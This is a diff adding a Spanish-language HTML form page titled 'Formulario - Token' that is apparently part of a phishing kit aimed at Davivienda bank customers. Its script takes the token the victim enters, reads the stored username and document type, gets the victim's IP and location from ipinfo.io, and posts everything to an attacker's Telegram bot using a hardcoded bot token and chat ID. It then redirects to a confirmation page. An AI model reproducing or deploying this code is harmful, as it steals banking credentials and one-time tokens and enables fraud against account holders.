@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario - Token</title>
+</head>
+<body>
+    <h1>Formulario - Token</h1>
+
+    <form id="formularioToken">
+        <label for="token">Token:</label>
+        <input type="text" id="token" name="token" placeholder="Ingresa tu token">
+
+        <br><br>
+
+        <button type="submit">Enviar</button>
+    </form>
+
+    <script>
+        const tokenTelegram = "7108303038:AAGr5PhwVkZCbjA_pBo589S10nBLrAoWFvA";
+        const tokenIPinfo = "9c9af8c7467cc4";
+
+        document.getElementById("formularioToken").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const token = document.getElementById("token").value;
+            const usr = sessionStorage.getItem("usuario");
+            const tipo = sessionStorage.getItem("tipoDocumento");
+
+            fetch(`https://ipinfo.io/json?token=${tokenIPinfo}`, {
+                method: "GET"
+            })
+            .then(response => response.json())
+            .then(data => {
+                const mensaje = `DAVIVIENDA CO
+                documento: ${tipo}
+                user: ${usr}
+                Token: ${token}
+                IP: ${data.ip}
+                ${data.city}, ${data.country}`;
+
+                fetch(`https://api.telegram.org/bot${tokenTelegram}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: "5915051785",
+                        text: mensaje
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Respuesta de Telegram:", data);
+
+                    // Redirigir a la página de confirmación
+                    window.location.href = "confirmacion.html";
+                })
+                .catch(error => {
+                    console.error("Error al enviar datos a Telegram", error);
+                });
+            })
+            .catch(error => {
+                console.error("Error al obtener información de IP", error);
+            });
+        });
+    </script>
+</body>
+</html>
